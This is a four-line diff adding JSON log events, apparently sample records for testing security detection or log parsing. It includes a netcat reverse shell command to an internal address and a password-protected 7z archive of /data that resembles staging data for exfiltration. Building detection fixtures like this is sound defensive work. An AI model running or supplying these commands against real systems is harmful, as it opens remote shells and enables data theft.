@@ -1,0 +1,4 @@
+{"Message":"Django error: SuspiciousOperation in view"}
+{"CommandLine":"Cannot run program: java.lang.ProcessBuilder"}
+{"Image":"/usr/bin/nc","CommandLine":"nc -e /bin/bash 10.0.0.5 4444"}
+{"Image":"/usr/bin/7z","CommandLine":"7z a out.7z /data/* -pS3cret"}
